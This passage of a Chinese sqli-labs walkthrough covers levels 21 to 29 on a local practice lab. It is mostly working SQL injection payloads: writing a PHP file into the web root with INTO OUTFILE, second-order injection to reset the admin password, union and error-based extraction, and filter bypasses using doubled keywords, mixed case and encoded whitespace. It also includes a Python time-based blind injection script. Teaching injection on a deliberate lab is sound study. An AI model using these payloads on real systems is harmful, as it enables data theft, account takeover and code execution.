</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p><img src="/medias/sqli-labs/42.png" alt="42"></p> <p>尝试写入文件，这里php文件内容使用16进制编码</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>uname<span class="token operator">=</span>a<span class="token string">') union select 11,22,0x3c3f3d706870696e666f28293b3f3e into outfile '</span><span class="token operator">/</span>var<span class="token operator">/</span>www<span class="token operator">/</span>html<span class="token operator">/</span>Less<span class="token operator">-</span><span class="token number">21</span><span class="token operator">/</span><span class="token number">4.</span>php'<span class="token comment">#</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p><img src="/medias/sqli-labs/43.png" alt="43"></p> <h2 id="less-22"><a href="#less-22" class="header-anchor">#</a> Less-22</h2> <p>同上一关，单引号换为双引号类型了，没有括号包裹</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>uname<span class="token operator">=</span>a&quot; <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">11</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">0x3c3f3d706870696e666f28293b3f3e</span> <span class="token keyword">into</span> <span class="token keyword">outfile</span> <span class="token string">'/var/www/html/Less-22/1.php'</span><span class="token comment">#</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h2 id="less-23"><a href="#less-23" class="header-anchor">#</a> Less-23</h2> <p>一直绕过不去，看看源码，把原来用来注释掉后面内容的注释符给过滤掉了</p> <p><img src="/medias/sqli-labs/44.png" alt="44"></p> <p>现在也可以sql注入，payload最后留个单引号闭合原有的单引号就可以了</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>?id<span class="token operator">=</span>a<span class="token string">' or 1='</span><span class="token number">1</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p><img src="/medias/sqli-labs/45.png" alt="45"></p> <p>这里不能使用order by测字段个数了</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>?id<span class="token operator">=</span><span class="token number">0</span><span class="token string">' union select 1,2,3,'</span><span class="token number">4</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p><img src="/medias/sqli-labs/46.png" alt="46"></p> <p><img src="/medias/sqli-labs/47.png" alt="47"></p> <p>套个子查询拿数据</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>?id<span class="token operator">=</span><span class="token number">0</span><span class="token string">' union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),'</span><span class="token number">3</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p><img src="/medias/sqli-labs/48.png" alt="48"></p> <h2 id="less-24"><a href="#less-24" class="header-anchor">#</a> Less-24</h2> <p>查看题目源码，注册功能上没有sql注入，即是有特殊字符，也会转义</p> <div class="language-php line-numbers-mode"><pre class="language-php"><code><span class="token variable">$username</span><span class="token operator">=</span>  <span class="token function">mysql_escape_string</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">;</span>
<span class="token variable">$pass</span><span class="token operator">=</span> <span class="token function">mysql_escape_string</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$re_pass</span><span class="token operator">=</span> <span class="token function">mysql_escape_string</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'re_password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">&quot;insert into users ( username, password) values(\&quot;<span class="token interpolation"><span class="token variable">$username</span></span>\&quot;, \&quot;<span class="token interpolation"><span class="token variable">$pass</span></span>\&quot;)&quot;</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><p>在密码修改功能上也使用了转义，</p> <div class="language-php line-numbers-mode"><pre class="language-php"><code><span class="token variable">$username</span><span class="token operator">=</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string double-quoted-string">&quot;username&quot;</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$curr_pass</span><span class="token operator">=</span> <span class="token function">mysql_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'current_password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$pass</span><span class="token operator">=</span> <span class="token function">mysql_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$re_pass</span><span class="token operator">=</span> <span class="token function">mysql_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'re_password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">&quot;UPDATE users SET PASSWORD='<span class="token interpolation"><span class="token variable">$pass</span></span>' where username='<span class="token interpolation"><span class="token variable">$username</span></span>' and password='<span class="token interpolation"><span class="token variable">$curr_pass</span></span>' &quot;</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br></div></div><p>可以通过注册一个<code>admin'#</code>用户，虽然字符被转义了利用不了，但是可以在密码修改功能里，用户名没有使用转义，拼接进去时可以直接利用</p> <p>思路：注册一个用户，用户名使用<code>admin'#</code>，密码随意，在密码修改时，利用sql语句漏洞来修改用户<code>admin</code>的密码</p> <p>用户<code>admin'#</code>在修改密码时，sql语句变成</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code><span class="token keyword">UPDATE</span> users <span class="token keyword">SET</span> PASSWORD<span class="token operator">=</span><span class="token string">'$pass'</span> <span class="token keyword">where</span> username<span class="token operator">=</span><span class="token string">'admin'</span><span class="token comment">#' and password='$curr_pass' </span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>通过修改用户<code>admin'#</code>的密码，来修改用户<code>admin</code>的密码</p> <p><img src="/medias/sqli-labs/49.png" alt="49"></p> <h2 id="less-25"><a href="#less-25" class="header-anchor">#</a> Less-25</h2> <div class="language-php line-numbers-mode"><pre class="language-php"><code><span class="token variable">$id</span><span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/or/i'</span><span class="token punctuation">,</span><span class="token string double-quoted-string">&quot;&quot;</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$id</span><span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/AND/i'</span><span class="token punctuation">,</span><span class="token string double-quoted-string">&quot;&quot;</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>查看源码，题目过滤了<code>or</code>、<code>adn</code>，也可以通过测试的报错语句猜测过滤黑名单</p> <ul><li>传入<code>?id=1'</code>，报错：<code>'1'' LIMIT 0,1</code></li> <li>传入<code>?id=1'#</code>，不报错</li> <li>传入<code>?id=1' or 1=1#</code>，报错：<code>1=1#' LIMIT 0,1</code></li></ul> <p>后面的注释肯定是生效的，不会因为后面的语句报错</p> <p>没有从<code>1'</code>开始报错，说明<code>1'</code>也成功闭合了</p> <p>没有回显<code>1'</code>后的<code>or</code>，直接回显了<code>1=1#</code>，说明<code>or</code>被替换为空了</p> <p>尝试双写，里一层外一层，在匹配到里面一层并替换为空时，外面一层or成为新的or，也可以适用到其他关键字被一次过滤时</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>oorr  <span class="token operator">&gt;</span>  <span class="token operator">or</span>
selselectect  <span class="token operator">&gt;</span>  <span class="token keyword">select</span>  <span class="token comment"># 在一个select里的任意位置再写一个select</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>这题可以直接联合查询</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>?id<span class="token operator">=</span><span class="token number">0</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token operator">%</span><span class="token number">23</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p><img src="/medias/sqli-labs/50.png" alt="50"></p> <p>考察双写绕过</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>?id<span class="token operator">=</span><span class="token number">0</span>' oorr updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p><img src="/medias/sqli-labs/51.png" alt="51"></p> <h2 id="less-25a"><a href="#less-25a" class="header-anchor">#</a> Less-25a</h2> <p>整型注入，过滤了<code>or</code>、<code>and</code></p> <p>测试发现单双引号不会报错，报错注入不可行，可以使用联合查询，测试过程</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>?id<span class="token operator">=</span><span class="token number">0</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token comment">#</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>题目名称提示使用<code>or</code>、<code>and</code>盲注，写个脚本试试</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token keyword">import</span> requests
<span class="token keyword">import</span> string
<span class="token keyword">import</span> time
<span class="token comment"># 下划线放最后，避免当作统配符吃掉特殊字符</span>
flags <span class="token operator">=</span> <span class="token string">'abcdefghijklmnopqrstuvwxyz0123456789,-\{\}_'</span>
flag <span class="token operator">=</span> <span class="token string">&quot;&quot;</span>

url <span class="token operator">=</span> <span class="token string">&quot;http://127.0.0.1:8080/Less-25a/&quot;</span>
i <span class="token operator">=</span> <span class="token number">1</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;脚本正在运行.......&quot;</span><span class="token punctuation">)</span>
<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
    
    <span class="token keyword">for</span> s <span class="token keyword">in</span> flags<span class="token punctuation">:</span>
        <span class="token comment"># 爆库</span>
        <span class="token builtin">id</span> <span class="token operator">=</span> <span class="token string">&quot;0 oorr if((substr((select group_concat(schema_name) from infoorrmation_schema.schemata),&quot;</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">&quot;,1)='&quot;</span><span class="token operator">+</span> s <span class="token operator">+</span><span class="token string">&quot;'),sleep(0.1),0)%23&quot;</span>
        <span class="token comment"># 爆表</span>
        <span class="token comment"># id = &quot;0 oorr if((substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&quot; + str(i)+&quot;,1)='&quot;+ s +&quot;'),sleep(0.1),0)%23&quot;</span>
        <span class="token comment"># 爆字段</span>
        <span class="token comment"># id = &quot;0 oorr if((substr((select group_concat(column_name) from information_schema.columns where table_schema=database()),&quot; + str(i)+&quot;,1)='&quot;+ s +&quot;'),sleep(0.1),0)%23&quot;</span>
        tmp_url <span class="token operator">=</span> url <span class="token operator">+</span> <span class="token string">&quot;?id=&quot;</span> <span class="token operator">+</span> <span class="token builtin">id</span>
        start <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
        resp <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>tmp_url<span class="token punctuation">)</span>
        end <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> end <span class="token operator">-</span> start <span class="token operator">&gt;</span> <span class="token number">0.1</span><span class="token punctuation">:</span>
            flag <span class="token operator">+=</span> s
            <span class="token comment"># 当盲注出正确字符时，才去盲注下一位(变量i的作用)</span>
            i <span class="token operator">+=</span> <span class="token number">1</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f&quot;[#]------result: </span><span class="token interpolation"><span class="token punctuation">{</span>flag<span class="token punctuation">}</span></span><span class="token string">&quot;</span></span><span class="token punctuation">)</span>
            <span class="token keyword">break</span>
        <span class="token keyword">elif</span> end <span class="token operator">-</span> start <span class="token operator">&gt;</span> <span class="token number">2</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;跑了这么久，跑完了吗？跑完我给你停了🤓👍&quot;</span><span class="token punctuation">)</span>
            exit<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            <span class="token keyword">pass</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br></div></div><p><img src="/medias/sqli-labs/52.png" alt="52"></p> <h2 id="less-26"><a href="#less-26" class="header-anchor">#</a> Less-26</h2> <p>题目名称提示过滤了空格、注释、以及前面的<code>or</code>、<code>and</code></p> <p>因为是get传参，还可以使用<code>%09</code>、<code>%0a</code>、<code>%0b</code>、<code>%0c</code>、<code>%0d</code>、<code>%a0</code>绕过</p> <p>我测，通过报错发现这里的sql语句<code>'1'' LIMIT 0,1</code>，是单引号包裹的id</p> <p>发现这题可以用<code>$0b</code>，<code>%a0</code>替换空格</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>?id<span class="token operator">=</span><span class="token number">0</span><span class="token string">'union%0bselect%0b1,2,'</span><span class="token number">3</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>爆表，注意单词<code>information_schema</code>里有个<code>or</code>，也要双写</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>?id<span class="token operator">=</span><span class="token number">0</span><span class="token string">'union%0bselect%0b1,(select%0bgroup_concat(table_name)%0bfrom%0binfoorrmation_schema.tables%0bwhere%0btable_schema=database()),'</span><span class="token number">3</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h2 id="less-26a"><a href="#less-26a" class="header-anchor">#</a> Less-26a</h2> <p>相比上关，添加了<code>()</code>包裹<code>id</code>，因为不能使用注释符，所以需要考虑闭合后，后面的<code>')</code>怎么处理</p> <p>也好处理，可以<code>select 1,2,('3')</code>的形式，闭合后面的<code>')</code>，避免语法错误无法执行</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>?id<span class="token operator">=</span><span class="token number">0</span><span class="token string">')union%0bselect%0b1,(select%0bgroup_concat(table_name)%0bfrom%0binfoorrmation_schema.tables%0bwhere%0btable_schema=database()),('</span><span class="token number">3</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p><img src="/medias/sqli-labs/53.png" alt="53"></p> <h2 id="less-27"><a href="#less-27" class="header-anchor">#</a> Less-27</h2> <p>过滤语句，过滤空格、注释符、union、select等，把or、and放出来了</p> <div class="language-php line-numbers-mode"><pre class="language-php"><code><span class="token variable">$id</span><span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[\/\*]/'</span><span class="token punctuation">,</span><span class="token string double-quoted-string">&quot;&quot;</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$id</span><span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[--]/'</span><span class="token punctuation">,</span><span class="token string double-quoted-string">&quot;&quot;</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$id</span><span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[#]/'</span><span class="token punctuation">,</span><span class="token string double-quoted-string">&quot;&quot;</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$id</span><span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[ +]/'</span><span class="token punctuation">,</span><span class="token string double-quoted-string">&quot;&quot;</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$id</span><span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/select/m'</span><span class="token punctuation">,</span><span class="token string double-quoted-string">&quot;&quot;</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$id</span><span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[ +]/'</span><span class="token punctuation">,</span><span class="token string double-quoted-string">&quot;&quot;</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$id</span><span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/union/s'</span><span class="token punctuation">,</span><span class="token string double-quoted-string">&quot;&quot;</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$id</span><span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/select/s'</span><span class="token punctuation">,</span><span class="token string double-quoted-string">&quot;&quot;</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$id</span><span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/UNION/s'</span><span class="token punctuation">,</span><span class="token string double-quoted-string">&quot;&quot;</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$id</span><span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/SELECT/s'</span><span class="token punctuation">,</span><span class="token string double-quoted-string">&quot;&quot;</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$id</span><span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/Union/s'</span><span class="token punctuation">,</span><span class="token string double-quoted-string">&quot;&quot;</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$id</span><span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/Select/s'</span><span class="token punctuation">,</span><span class="token string double-quoted-string">&quot;&quot;</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br></div></div><p>大小写混写绕过</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>?id<span class="token operator">=</span><span class="token number">0</span><span class="token string">'unIon%0bselEct%0b1,(seleCt%0bgroup_concat(table_name)%0bfrom%0binformation_schema.tables%0bwhere%0btable_schema=database()),'</span><span class="token number">3</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p><img src="/medias/sqli-labs/55.png" alt="55"></p> <h2 id="less-27a"><a href="#less-27a" class="header-anchor">#</a> Less-27a</h2> <p>双引号类型，其他似乎都一样</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>?id<span class="token operator">=</span><span class="token number">0</span><span class="token string">&quot;%0bUnIon%0bSeLeCt%0b1,(seLect%0bgroup_concat(schema_name)%0bfrom%0binformation_schema.schemata),&quot;</span><span class="token number">3</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p><img src="/medias/sqli-labs/54.png" alt="54"></p> <h2 id="less-28"><a href="#less-28" class="header-anchor">#</a> Less-28</h2> <p>不区分大小写来过滤，会把<code>union*select</code>不区分大小写的过滤掉</p> <div class="language-php line-numbers-mode"><pre class="language-php"><code><span class="token variable">$id</span><span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[\/\*]/'</span><span class="token punctuation">,</span><span class="token string double-quoted-string">&quot;&quot;</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$id</span><span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[--]/'</span><span class="token punctuation">,</span><span class="token string double-quoted-string">&quot;&quot;</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$id</span><span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[#]/'</span><span class="token punctuation">,</span><span class="token string double-quoted-string">&quot;&quot;</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$id</span><span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[ +]/'</span><span class="token punctuation">,</span><span class="token string double-quoted-string">&quot;&quot;</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$id</span><span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[ +]/'</span><span class="token punctuation">,</span><span class="token string double-quoted-string">&quot;&quot;</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$id</span><span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/union\s+select/i'</span><span class="token punctuation">,</span><span class="token string double-quoted-string">&quot;&quot;</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br></div></div><p>测试回显来判断后台sql语句应该是<code>')</code>包裹的</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>?id<span class="token operator">=</span><span class="token number">0</span><span class="token string">')%0bor%0b1=('</span><span class="token number">1</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p><img src="/medias/sqli-labs/56.png" alt="56"></p> <p>畸形双写绕过，<code>union</code>里套一个<code>union%0aselect</code>，利用正则吞掉里面的<code>union\sselect</code>，太奇怪了，正则<code>union\sselect</code>里的<code>\s</code>不能匹配<code>%0b</code></p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>?id<span class="token operator">=</span><span class="token number">0</span><span class="token string">')%0buniounion%0aselectn%0bselect%0b1,2,('</span><span class="token number">3</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p><img src="/medias/sqli-labs/57.png" alt="57"></p> <p>爆库</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>?id<span class="token operator">=</span><span class="token number">0</span><span class="token string">')%0buniounion%0aselectn%0bselect%0b1,(select%0agroup_concat(table_name)%0afrom%0ainformation_schema.tables%0awhere%0atable_schema=database()),('</span><span class="token number">3</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h2 id="less-28a"><a href="#less-28a" class="header-anchor">#</a> Less-28a</h2> <p>翻阅源码，过滤减少了。测试思路同上题</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>?id<span class="token operator">=</span><span class="token number">0</span><span class="token string">')uNIounion%0aselectn%a0select%0a1,2,('</span><span class="token number">3</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h2 id="less-29-http参数污染"><a href="#less-29-http参数污染" class="header-anchor">#</a> Less-29 HTTP参数污染</h2> <p>我去，这关有意思，先看看源码</p> <p>把url参数id的值赋给$query_string，然后以&amp;分割成数组，然后取id的值</p> <div class="language-php line-numbers-mode"><pre class="language-php"><code><span class="token comment">// 把url参数id的值赋给$query_string，然后以&amp;分割成数组，然后取id的值</span>
<span class="token keyword">function</span> <span class="token function-definition function">java_implimentation</span><span class="token punctuation">(</span><span class="token variable">$query_string</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
	<span class="token variable">$q_s</span> <span class="token operator">=</span> <span class="token variable">$query_string</span><span class="token punctuation">;</span>
	<span class="token variable">$qs_array</span><span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string double-quoted-string">&quot;&amp;&quot;</span><span class="token punctuation">,</span><span class="token variable">$q_s</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$qs_array</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=&gt;</span> <span class="token variable">$value</span><span class="token punctuation">)</span>
	<span class="token punctuation">{</span>
		<span class="token variable">$val</span><span class="token operator">=</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$val</span><span class="token operator">==</span><span class="token string double-quoted-string">&quot;id&quot;</span><span class="token punctuation">)</span>
		<span class="token punctuation">{</span>
			<span class="token variable">$id_value</span><span class="token operator">=</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
			<span class="token keyword">return</span> <span class="token variable">$id_value</span><span class="token punctuation">;</span>
			<span class="token keyword">echo</span> <span class="token string double-quoted-string">&quot;&lt;br&gt;&quot;</span><span class="token punctuation">;</span>
			<span class="token keyword">break</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span>
	<span class="token punctuation">}</span>
<span class="token punctuation">}</span>
